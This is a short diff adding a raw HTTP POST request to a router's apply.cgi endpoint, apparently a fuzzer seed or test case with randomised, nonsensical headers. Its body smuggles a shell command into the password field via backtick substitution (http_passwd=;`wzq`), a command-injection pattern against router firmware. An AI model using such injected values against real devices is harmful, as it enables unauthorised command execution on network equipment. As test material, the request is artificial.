@@ -1,0 +1,11 @@
+POST /apply.cgi?/top.html timestamp= HTTP/1.1
+Content-Type: application/json
+Host: 191
+auto_upgrade_detwan: block_services_del
+Accept-Language: 163
+download_confile: 
+LANGUAGE: debuginfo.htm
+welcome_detwan: 112
+Content-Length: 69
+
+wan_proto=pppoe&http_passwd=;`wzq`&submit_flag=pptp&%20timestamp=&wzq
